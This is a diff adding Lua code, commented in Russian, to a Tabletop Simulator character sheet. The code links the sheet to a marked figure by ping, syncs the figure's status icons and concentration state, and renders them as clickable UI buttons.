+--     реально изменился набор иконок или реестр (сигнатуры ниже) — не на
+--     каждое входящее уведомление.
+--
+-- Переменные ниже объявлены БЕЗ local (глобальные) намеренно — см.
+-- пояснение в шапке файла про лимит в 200 локальных переменных на чанк.
+--============================================================
+
+-- Цвет игрока, ожидающего следующего TAB-пинга для привязки фигурки к
+-- листу (nil = никто не ждёт). Временное состояние UI, не сохраняется.
+pendingLinkFigureColor = nil
+
+-- Закэшированный реестр "имя статуса -> URL картинки" привязанной фигурки.
+-- Приходит один раз при регистрации, дальше используется на всех
+-- последующих (уже облегчённых) уведомлениях об изменении статусов.
+cachedFigureStatusRegistry = nil
+
+-- Закэшированный реестр "имя статуса -> текст подсказки" (см.
+-- STATUS_DESCRIPTIONS в Маркиратор_V11.lua). Приходит и обновляется вместе
+-- с cachedFigureStatusRegistry — по той же схеме (один раз при регистрации).
+cachedFigureStatusDescriptions = nil
+
+-- "Отпечаток" текущего набора отображаемых иконок (отсортированные имена
+-- через "|") — чтобы не перерисовывать self.UI, если ничего не изменилось.
+lastStatusIconsSignature = nil
+
+-- Аналогичный отпечаток последнего набора ассетов, переданного в
+-- self.UI.setCustomAssets — пересобираем ассеты только при реальной смене реестра.
+lastStatusIconsAssetsSignature = nil
+
+-- Проверяет, что объект промаркирован Маркиратором (по сигнатуре в его
+-- Lua-скрипте — тем же способом, которым сам Маркиратор отличает уже
+-- промаркированные фигурки от обычных).
+function isMarkedFigureObject(obj)
+    if obj == nil then return false end
+    local ok, script = pcall(function() return obj.getLuaScript() end)
+    if not ok or type(script) ~= "string" then return false end
+    return string.find(script, "MARKER_SCRIPT_V") ~= nil
+end
+
+-- Общий сброс состояния привязки к фигурке — используется и при явной
+-- отвязке (onClickUnlinkFigure), и при перепривязке к другой фигурке
+-- (onPingLinkFigure), и когда фигурку размаркировали/удалили (OnFigureUnmarked),
+-- и когда не удалось восстановить регистрацию после загрузки партии
+-- (initStatusIconSync). Раньше это было 4 копии одного и того же набора
+-- присвоений — легко было забыть обнулить одно из полей в одном из мест.
+-- clearUI=true также убирает панель иконок со стола (не нужно, например,
+-- в onPingLinkFigure — там её тут же перерисует ответ новой фигурки).
+function forgetLinkedFigure(clearUI)
+    ref_buttonData.linkedFigureGuid = nil
+    cachedFigureStatusRegistry = nil
+    cachedFigureStatusDescriptions = nil
+    lastStatusIconsSignature = nil
+    lastStatusIconsAssetsSignature = nil
+    -- Без привязанной фигурки лист не может знать, активна ли концентрация —
+    -- сбрасываем, чтобы не остаться со "залипшим" Вкл и не слать напоминания вслепую
+    ref_buttonData.concentrationActive = false
+    updateSave()
+    updateLockContextMenu()
+    if clearUI then
+        clearStatusIcons()
+    end
+end
+
+-- ПКМ -> "Привязать фигурку": включает режим ожидания TAB-пинга
+function onClickLinkFigure(playerColor)
+    pendingLinkFigureColor = playerColor
+    updateLockContextMenu()
+    printToColor(
+        "Наведите курсор на фигурку, промаркированную Маркиратором, и нажмите Tab (ping), чтобы привязать её к листу. Промах отменит привязку — при необходимости запустите её заново.",
+        playerColor,
+        {1, 1, 1}
+    )
+end
+
+-- ПКМ -> "Отменить привязку" (доступно, пока лист ждёт пинг)
+function onClickCancelLinkFigure(playerColor)
+    pendingLinkFigureColor = nil
+    updateLockContextMenu()
+    printToColor("Привязка фигурки отменена.", playerColor, {0.9, 0.8, 0.2})
+end
+
+-- ПКМ -> "Отвязать фигурку": снимаем регистрацию у фигурки (если она ещё
+-- существует), чтобы она перестала слать нам уведомления впустую
+function onClickUnlinkFigure(playerColor)
+    local figure = getObjectFromGUID(ref_buttonData.linkedFigureGuid)
+    if figure ~= nil then
+        pcall(function() figure.call("UnregisterListener", self.getGUID()) end)
+        -- [НОВОЕ] Снимаем и обратную ссылку "владелец" (см. SetOwnerSheet) —
+        -- иначе клик-таргетинг книги ошибочно продолжит резолвить эту
+        -- фигурку на уже отвязанный от неё лист.
+        pcall(function() figure.call("SetOwnerSheet", nil) end)
+    end
+
+    forgetLinkedFigure(true)
+    printToColor("Фигурка отвязана от листа.", playerColor, {0.9, 0.8, 0.2})
+end
+
+-- Ищет промаркированную Маркиратором фигурку рядом с точкой пинга физическим
+-- боксом-рейкастом вверх — тем же приёмом, которым сам Маркиратор ищет
+-- фигурки над собой (см. processObjects в Маркиратор_V11.lua), а не только
+-- через player.getHoverObject(), который в некоторых ситуациях не отдаёт
+-- объект под курсором. Если под пинг попало несколько объектов —
+-- берём ближайший (наименьшая hit.distance).
+function findMarkedFigureNearPosition(position)
+    local ok, hitList = pcall(function()
+        return Physics.cast({
+            origin       = position,
+            direction    = {0, 1, 0},
+            type         = 3, -- box
+            size         = {1.5, 4, 1.5},
+            orientation  = {0, 0, 0},
+            max_distance = 3
+        })
+    end)
+    if not ok or type(hitList) ~= "table" then
+        return nil
+    end
+
+    local best, bestDist = nil, nil
+    for _, hit in ipairs(hitList) do
+        local obj = hit.hit_object
+        if obj ~= nil and obj ~= self and isMarkedFigureObject(obj) then
+            if bestDist == nil or hit.distance < bestDist then
+                best = obj
+                bestDist = hit.distance
+            end
+        end
+    end
+    return best
+end
+
+-- Вызывается из onPlayerPing, когда лист ждёт привязки и игрок, за которым
+-- она числится, пингует стол. Сначала пробуем то, что сейчас под курсором
+-- игрока (player.getHoverObject() — дёшево и точно, когда работает), и если
+-- это не промаркированная фигурка — подстраховываемся физическим поиском
+-- рядом с точкой пинга (findMarkedFigureNearPosition), который не зависит
+-- от состояния курсора игрока и надёжнее в целом.
+-- Режим ожидания сбрасывается СРАЗУ, при любом исходе — если фигурка не
+-- нашлась, привязку нужно запускать заново, а не ждать следующего пинга.
+function onPingLinkFigure(player, position)
+    pendingLinkFigureColor = nil
+    updateLockContextMenu()
+
+    local target = player.getHoverObject()
+    if target == self or not isMarkedFigureObject(target) then
+        target = findMarkedFigureNearPosition(position)
+    end
+
+    if target == nil then
+        printToColor(
+            "Промаркированная фигурка не найдена рядом с точкой пинга. Наведьтесь точнее и запустите привязку заново (ПКМ -> \"Привязать фигурку\").",
+            player.color,
+            {1, 0.4, 0.4}
+        )
+        return
+    end
+
+    -- Если лист уже был привязан к ДРУГОЙ фигурке — сперва отписываемся от
+    -- неё (иначе она навсегда останется думать, что мы её подписчик, и будет
+    -- впустую слать нам OnFigureStatusChanged даже после перепривязки).
+    if ref_buttonData.linkedFigureGuid ~= nil and ref_buttonData.linkedFigureGuid ~= target.getGUID() then
+        local oldFigure = getObjectFromGUID(ref_buttonData.linkedFigureGuid)
+        if oldFigure ~= nil then
+            pcall(function() oldFigure.call("UnregisterListener", self.getGUID()) end)
+            pcall(function() oldFigure.call("SetOwnerSheet", nil) end) -- [НОВОЕ] см. onClickUnlinkFigure
+        end
+    end
+
+    ref_buttonData.linkedFigureGuid = target.getGUID()
+    cachedFigureStatusRegistry = nil
+    cachedFigureStatusDescriptions = nil
+    lastStatusIconsSignature = nil
+    lastStatusIconsAssetsSignature = nil
+    updateSave()
+    updateLockContextMenu()
+
+    local figName = target.getName()
+    if figName == "" then figName = "Фигурка" end
+    printToColor("🔗 Привязано: " .. figName, player.color, {0, 1, 0})
+
+    -- Регистрируемся у фигурки как слушатель — в ответ она сразу же (в
+    -- рамках этого же вызова) пришлёт текущее состояние через
+    -- OnFigureStatusChanged, отдельного запроса делать не нужно.
+    local ok = pcall(function() target.call("RegisterListener", self.getGUID()) end)
+    if not ok then
+        printToColor("Не удалось связаться с фигуркой — попробуйте привязать ещё раз.", player.color, {1, 0.4, 0.4})
+    end
+
+    -- [НОВОЕ] Отдельно от подписки на статусы — сообщаем фигурке, что именно
+    -- ЭТОТ лист теперь её владелец (см. SetOwnerSheet/GetOwnerSheetGuid в
+    -- Маркиратор.lua). Нужно книге заклинаний для клик-таргетинга.
+    pcall(function() target.call("SetOwnerSheet", self.getGUID()) end)
+end
+
+-- [НОВОЕ] Публичный API: книга заклинаний вызывает это сразу после того, как
+-- привязывает к себе лист (см. onPingLinkCharacterSheet в Гримуар_.lua),
+-- чтобы лист знал цвет своей книги — последнее звено цепочки
+-- "фигурка -> лист -> книга" для клик-таргетинга при касте.
+function SetOwnerBookColor(bookColor)
+    ref_buttonData.ownerBookColor = (bookColor ~= nil and bookColor ~= "") and bookColor or nil
+    updateSave()
+end
+
+-- Возвращает цвет книги, привязанной к этому листу (или nil).
+function GetOwnerBookColor()
+    return ref_buttonData.ownerBookColor
+end
+
+-- [НОВОЕ] Публичный геттер: GUID фигурки, привязанной к ЭТОМУ листу (или
+-- nil). В отличие от SetOwnerSheet/GetOwnerSheetGuid на самой фигурке (та
+-- обратная связь нужна для будущего клик-таргетинга) — это ПРЯМОЕ чтение
+-- уже существующего ref_buttonData.linkedFigureGuid, нужен книге заклинаний
+-- для построения списка целей в виде всплывающего окна (см.
+-- GetBoundFigureInfo в Гримуар_.lua): книга -> лист (уже привязан,
+-- globalState.characterSheetGuid) -> эта функция -> фигурка -> её имя.
+function GetLinkedFigureGuid()
+    return ref_buttonData.linkedFigureGuid
+end
+
+-- [НОВОЕ] Публичный геттер: текущая Скорость персонажа в футах — вызывается
+-- привязанной фигуркой (Маркиратор) при взятии в руки, если у неё включена
+-- функция "Расчёт пути" (см. startPathTracking в Маркиратор_2.lua). Отдаёт
+-- ИТОГОВОЕ значение поля (истощение уже учтено — см. computeExhaustionSpeedValue/
+-- refreshFieldTint, которые пишут готовое число прямо в textbox), поэтому
+-- здесь достаточно просто прочитать поле, ничего пересчитывать не нужно.
+-- Возвращает число (футы) или nil, если поле пустое/не число.
+function GetSpeed()
+    return tonumber(ref_buttonData.textbox[TEXTBOX_SPEED_ID].value)
+end
+
+-- Публичная функция: вызывается ФИГУРКОЙ через obj.call при регистрации
+-- (полный пакет с реестром картинок и описаний) и при каждом реальном
+-- изменении статусов (облегчённый пакет — без них, они уже закэшированы
+-- после регистрации).
+-- data = {guid = <GUID фигурки>, states = {...}, registry = {...}|nil, descriptions = {...}|nil}
+function OnFigureStatusChanged(data)
+    if type(data) ~= "table" or data.guid ~= ref_buttonData.linkedFigureGuid then
+        -- Уведомление от фигурки, к которой лист уже не привязан
+        -- (например, "запоздавшее" сообщение сразу после отвязки/перепривязки) — игнорируем.
+        return
+    end
+
+    if type(data.registry) == "table" then
+        cachedFigureStatusRegistry = data.registry
+    end
+    if type(data.descriptions) == "table" then
+        cachedFigureStatusDescriptions = data.descriptions
+    end
+
+    -- Концентрация не завязана на реестр иконок (та же проверка ниже нужна
+    -- только для отрисовки полоски статусов) — синхронизируем её в любом случае
+    syncConcentrationFromFigureStates(data.states)
+
+    if cachedFigureStatusRegistry == nil then
+        return -- реестр ещё не пришёл (не должно происходить в норме) — нечем рисовать иконки
+    end
+
+    renderStatusIcons(data.states or {}, cachedFigureStatusRegistry, cachedFigureStatusDescriptions or {})
+end
+
+-- Публичная функция: вызывается ФИГУРКОЙ через obj.call, когда с неё сняли
+-- маркировку ("Очистить" в Маркираторе) или её удаляют со стола, пока она
+-- была привязана к этому листу — отвязываемся автоматически.
+function OnFigureUnmarked(figureGuid)
+    if figureGuid ~= ref_buttonData.linkedFigureGuid then
+        return
+    end
+
+    forgetLinkedFigure(true)
+end
+
+-- Строит и применяет self.UI-панель с иконками активных статусов.
+-- states       = {[имяСтатуса] = true, ...}    -- какие статусы активны
+-- registry     = {[имяСтатуса] = "url", ...}   -- где взять картинку для каждого
+-- descriptions = {[имяСтатуса] = "текст", ...} -- текст подсказки (может отсутствовать/быть пустым)
+function renderStatusIcons(states, registry, descriptions)
+    descriptions = descriptions or {}
+    local activeNames = {}
+    for name, isActive in pairs(states) do
+        if isActive and registry[name] then
+            table.insert(activeNames, name)
+        end
+    end
+    table.sort(activeNames)
+
+    if #activeNames == 0 then
+        clearStatusIcons()
+        return
+    end
+
+    -- Если набор активных статусов не поменялся — не трогаем self.UI лишний раз
+    local signature = table.concat(activeNames, "|")
+    if signature == lastStatusIconsSignature then
+        return
+    end
+    lastStatusIconsSignature = signature
+
+    -- Ассеты (картинки) пересобираем только если реестр реально поменялся
+    local registryCount = 0
+    for _ in pairs(registry) do registryCount = registryCount + 1 end
+    local assetsSignature = registryCount .. ":" .. tostring(registry[activeNames[1]])
+    if assetsSignature ~= lastStatusIconsAssetsSignature then
+        local assets = {}
+        for name, url in pairs(registry) do
+            table.insert(assets, {name = name, url = url})
+        end
+        self.UI.setCustomAssets(assets)
+        lastStatusIconsAssetsSignature = assetsSignature
+    end
+
+    local iconTags = {}
+    for _, name in ipairs(activeNames) do
+        local tooltip = descriptions[name]
+        if tooltip == nil or tooltip == "" then
+            tooltip = name -- нет описания — показываем хотя бы название статуса
+        end
+        -- Атрибут "value" у onClick намеренно не задаётся: тогда TTS сам
+        -- подставляет вторым аргументом код нажатой кнопки мыши ("-1" ЛКМ,
+        -- "-2" ПКМ) — именно на нём и построена развилка ЛКМ/ПКМ внутри
+        -- onClickStatusIconInfo.
+        table.insert(iconTags, string.format(
+            '<Button id="%s" onClick="onClickStatusIconInfo" image="%s" preserveAspect="true" preferredWidth="%d" preferredHeight="%d" color="rgba(1,1,1,1)"/>',
+            name, name, STATUS_ICON_SIZE, STATUS_ICON_SIZE
+        ))
+    end
+
+    local xml = string.format([[
+        <Panel id="StatusIconsPanel" position="%s" rotation="%s" scale="%s" width="%d" height="260">
+            <GridLayout cellSize="%d %d" spacing="10 10" childAlignment="MiddleCenter">
+                %s
+            </GridLayout>
+        </Panel>
+    ]],
+        STATUS_ICONS_UI_POSITION, STATUS_ICONS_UI_ROTATION, STATUS_ICONS_UI_SCALE,
+        STATUS_ICONS_PANEL_WIDTH, STATUS_ICON_SIZE + 10, STATUS_ICON_SIZE + 10,
+        table.concat(iconTags, "\n")
+    )
+
+    self.UI.setXml(xml)
+end
+
+-- Код кнопки мыши, который TTS подставляет вторым аргументом в onClick для
+-- ПКМ, когда атрибут "value" у элемента не задан (см. renderStatusIcons).
+-- ЛКМ отдельной константы не требует — это просто "всё остальное" (default-ветка).
+local MOUSE_BUTTON_RIGHT = "-2"
+
+-- Клик по иконке статуса на листе.
+-- ЛКМ  - выводит игроку описание статуса (то же, что в tooltip).
+-- ПКМ  - просит привязанную фигурку СНЯТЬ этот статус; иконка сама
+--        исчезнет с листа, когда фигурка в ответ пришлёт обновлённый
+--        набор статусов через OnFigureStatusChanged (обычное событие
+--        синхронизации, отдельно её тут ждать/прятать не нужно).
+function onClickStatusIconInfo(player, value, id)
+    if value == MOUSE_BUTTON_RIGHT then
+        requestRemoveFigureStatus(player, id)
+        return
+    end
+
+    local description = cachedFigureStatusDescriptions and cachedFigureStatusDescriptions[id]
+    if description == nil or description == "" then
+        description = "Описание для этого статуса не задано."
+    end
+    printToColor("Статус: " .. id .. "\n" .. description, player.color, {1, 1, 1})
+end
+
+-- Отправляет привязанной фигурке запрос на снятие конкретного статуса
+-- (вызывается по ПКМ на иконке, см. onClickStatusIconInfo выше).
+function requestRemoveFigureStatus(player, statusName)
+    if ref_buttonData.linkedFigureGuid == nil then
+        return
+    end
+
+    local figure = getObjectFromGUID(ref_buttonData.linkedFigureGuid)
+    if figure == nil then
+        printToColor("Фигурка не найдена — не удалось снять статус.", player.color, {1, 0.4, 0.4})
+        return
+    end
+
+    local ok = pcall(function() figure.call("RemoveStateRemote", statusName) end)
+    if not ok then
+        printToColor("Не удалось снять статус с фигурки (возможно, у неё устаревшая версия скрипта — перемаркируйте её).", player.color, {1, 0.4, 0.4})
+    end
+end
+
+-- Полностью убирает панель иконок с листа (если она не пуста)
+function clearStatusIcons()
+    if lastStatusIconsSignature ~= "" then
+        lastStatusIconsSignature = ""
+        self.UI.setXml("")
+    end
+end
+
+-- Запускается один раз в конце onload. Это НЕ повторяющийся опрос — просто
+-- одноразовая (пере)регистрация у уже привязанной по сохранению фигурки,
+-- потому что список слушателей хранится у фигурки в памяти (не в
+-- сохранении) и обнуляется при каждой загрузке партии. Задержка (Wait.time
+-- на 2 сек, БЕЗ повтора — третий аргумент отсутствует) даёт фигурке время
+-- закончить свой собственный onLoad/reload и объявить RegisterListener
+-- (порядок и скорость загрузки между разными объектами TTS не
+-- гарантированы); дальше — снова только события. Если фигурка всё равно не
+-- отвечает (RegisterListener ещё не существует/объект не тот) — откатываем
+-- привязку, а не оставляем лист висеть на "мёртвой" ссылке.
+function initStatusIconSync()
+    lastStatusIconsSignature = ""
+    lastStatusIconsAssetsSignature = ""
+
+    if ref_buttonData.linkedFigureGuid == nil then
+        return
+    end
+
+    Wait.time(function()
+        local figure = getObjectFromGUID(ref_buttonData.linkedFigureGuid)
+        if figure == nil or not isMarkedFigureObject(figure) then
+            forgetLinkedFigure(true)
+            return
+        end
+
+        local ok = pcall(function() figure.call("RegisterListener", self.getGUID()) end)
+        if not ok then
+            forgetLinkedFigure(true)
+        end
+    end, 2)
+end
